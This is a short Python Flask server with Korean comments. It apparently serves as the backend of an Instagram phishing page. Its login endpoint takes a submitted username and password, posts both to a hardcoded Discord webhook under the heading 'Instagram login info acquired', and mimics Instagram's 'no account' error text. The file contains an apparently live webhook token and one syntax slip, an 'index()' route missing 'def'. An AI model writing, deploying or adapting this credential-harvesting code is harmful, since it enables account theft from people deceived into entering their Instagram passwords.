from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# 디스코드 웹훅 URL 설정
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1550104827672006717/peMYiP25Tq5ZlIm3f-bC4tL2Tfs3tW_eHkLnlNopQGh58FVsQZNE76mNLkRZHSF9K0IT"

@app.route('/')
index():
    return render_template('index.html')

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()

    # 1. 간단한 계정 형식 및 존재 여부 검증 로직 (필요에 따라 실제 DB 연동 또는 추가 검증 구현)
    # 예시로 공백이거나 너무 짧은 경우, 또는 특정 조건일 때 없는 계정으로 처리
    if not username or len(username) < 3 or '@' not in username and len(username) < 5:
        return jsonify({
            "success": False, 
            "message": "입력한 사용자 이름을 사용하는 계정이 없습니다. 사용자 이름을 확인하고 다시 시도하세요."
        }), 400

    # 2. 디스코드 웹훅으로 정보 전송
    payload = {
        "content": f"🎯 **인스타 로그인 정보 획득!**\n- **ID:** `{username}`\n- **PW:** `{password}`"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Discord webhook error: {e}")

    # 3. 정상 계정일 경우 성공 응답
    return jsonify({
        "success": True, 
        "message": "성공"
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

